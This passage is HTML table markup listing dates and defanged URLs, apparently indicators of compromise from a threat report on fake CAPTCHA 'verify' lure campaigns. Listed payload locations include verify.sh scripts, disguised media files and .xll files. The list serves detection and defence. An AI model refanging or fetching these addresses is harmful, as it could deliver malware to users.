style=\"vertical-align: baseline;\">hXXps://tofukai[.]cfd/2/verify.sh</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-05-08</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://privatunis[.]cfd/1/verify.sh</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-05-05</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://e[.]overallwobbly[.]ru/era-stc</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-05-01</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://salorttactical[.]top/2/verify.sh</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-28</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://security-2u6g-log[.]com/1/verify.sh</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-28</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://lammysecurity[.]com/4/verify.sh</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-27</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://security-7f2c-run[.]com/2/verify.sh</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-26</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://security-9y5v-scan[.]com/3/verify.sh</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-25</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://security-9y5v-scan[.]com/7/verify.sh</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-24</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://security-a2k8-go[.]com/6/verify.sh</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-23</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://security-check-l2j4[.]com/verify.sh</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-23</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://security-2k7q-check[.]com/1/verify.sh</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-22</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://security-check-u8a6[.]com/2/verify.sh</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-20</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://betiv[.]fun/7456f63a46cc318334a70159aa3c4291[.]txt</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-16</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://jdiazmemory[.]com/4/verify[.]sh</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-16</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://fleebunga[.]sbs</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-05</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://captcha-verify-6r4x[.]com/verify[.]sh</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-05</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXp://power[.]moon-river-coin[.]xyz/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-04</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXp://run[.]fox-chair-dust[.]xyz/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-03</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://captcha-cdn[.]com/verify.sh</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-02</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXp://bridge[.]tree-sock-rain[.]today/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-29</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXp://ok[.]fish-cloud-jar[.]us/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-18</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXp://message[.]zoo-ciry[.]shop/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-16</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXp://text[.]cherry-pink[.]shop</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-13</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXp://sandbox[.]silver-map-generator[.]shop/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-12</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXp://items[.]kycc-camera[.]shop/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-11</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXp://def[.]ball-strike-up[.]shop/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-07</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXp://incognito[.]uploads[.]it[.]com</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-07</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://bytes[.]microstorage[.]shop/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-05</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://black[.]hologramm[.]us/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-04</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://xxx[.]retweet[.]shop/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-02</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://butanse[.]shop/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-01</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://rengular11[.]today/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-28</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://lumichain[.]pro/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-27</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://www[.]mediafire[.]com/file_premium/d6r4c3nzfv9mgl7/glass.mp3/file</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-26</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://www[.]mediafire[.]com/file_premium/8q094mjevfshw6g/glass.mp3/file</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-26</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://tumbl[.]design-x[.]xyz/glass.mp3</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-25</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://sandbox[.]yunqof[.]shop/macan.mp3</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-25</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://block[.]a-1-a1a[.]shop/drive.mp3</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-24</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://note1[.]nz7bn[.]pro/nnp.mp4</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-22</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://ai[.]fdswgw[.]shop/one.mp4</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-21</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://mnjk-jk[.]bsdfg-zmp-q-n[.]shop/1.mp4</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-20</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://nbhg-v[.]iuksdfb-f[.]shop/ajax.mp3</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-20</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://hur[.]bweqlkjr[.]shop/m41.mp4</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-19</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://hur[.]bweqlkjr[.]shop/1a.m4a</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-19</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://yob[.]yrwebsdf[.]shop/1a.m4a</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-19</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://yob[.]yrwebsdf[.]shop/3t.mp4</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-18</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://start[.]cleaning-room-device[.]shop/sha589.m4a</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-18</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://discover-travel-agency[.]pro/joke[.]m4a</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-18</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://discover-travel-agency[.]pro/walking[.]mp3</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-17</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://discover-travel-agency[.]pro/1[.]m4a</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-16</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://travel[.]image-gene-saver[.]it[.]com/1[.]m4a</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-16</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://ads[.]green-pickle-jo[.]shop/1.m4a</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-13</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptcha-verify-4h[.]pro/kangarooing.m4a</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-13</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptcha-manual[.]shop/kangarooing.m4a</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-11</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptcha-verify-4h[.]pro/xfiles/kangarooing[.]vsdx</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-11</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptcha-verify-4h[.]pro/xfiles/verify.mp4</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-10</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://human-verify[.]shop/xfiles/verify.mp4</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-10</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://human-verify-4r[.]pro/xfiles/verify.mp4</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-10</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://human-verify-4r[.]pro/xfiles/human[.]cpp</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-08</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://dns-verify-me[.]pro/xfiles/train.mp4</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-06</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXp://83[.]217[.]208[.]130/xfiles/Ohio.mp4</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-06</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXp://83[.]217[.]208[.]130/xfiles/VIDA.mp3</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-06</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXp://83[.]217[.]208[.]130/xfiles/VIDA.mp4</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-05</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXp://83[.]217[.]208[.]130/xfiles/trip.mp4</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-05</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXp://83[.]217[.]208[.]130/xfiles/trip[.]psd</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-05</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXp://80[.]64[.]30[.]238/trip[.]psd</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-03</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXp://80[.]64[.]30[.]238/evix.xll</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-03</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://raw[.]githubusercontent[.]com/fuad686337/tyu/refs/heads/main/BEGIMOT.xll</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-02</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://disable-data-ai-agent[.]pages[.]dev</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-01-23</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://microsoft-dns-reload-5q[.]pages[.]dev</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-01-22</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://microsoft-dns-reload-6l[.]pages[.]dev</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-01-02</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://microsoft-dns-reload-1n[.]pages[.]dev</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-31</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://microsoft-dns-reload-5m[.]pages[.]dev</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-30</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://microsoft-dns-reload-7m[.]pages[.]dev</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-28</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://microsoft-dns-reload-9q[.]pages[.]dev</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-28</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://microsoft-dns-reload-3h[.]pages[.]dev</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-27</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://microsoft-dns-reload-4r[.]pages[.]dev</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-25</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptcha-dns-b4[.]pages[.]dev</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-23</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://restart-dns-service-u2[.]pages[.]dev</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-21</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptha-verify-8u[.]pages[.]dev</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-20</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://microsoft-dns-reload-6y[.]pages[.]dev</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-19</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 